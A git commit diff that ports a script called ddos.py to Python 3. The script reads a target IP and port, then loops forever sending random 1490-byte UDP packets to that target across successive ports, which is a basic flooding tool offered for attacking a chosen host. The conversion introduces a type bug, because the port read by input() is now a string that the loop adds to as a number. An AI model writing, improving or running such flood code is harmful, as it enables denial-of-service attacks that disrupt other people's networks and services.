b1e1e75606c4507d6346d2135cdad6a0cb1b582d
Muhammed Hussein karimi <m.h.karimi1383@outlook.com>
2020-03-17 16:10:30 +0330

    Added support for Python3

--- ddos.py
+++ ddos.py
@@ -10,20 +10,19 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet Ali Ddos")
+print("figlet Ali Ddos")
 print
-print "Author : Ali Javadi"
-print "github : https://github.com/javadimoghadam"
+print("Author : Ali Javadi")
+print("github : https://github.com/javadimoghadam")
 print
-ip = raw_input("Target\'s IP : ")
+ip = input("Target\'s IP : ")
 port = input("Port : ")
 os.system("clear")
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (ip, port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
-
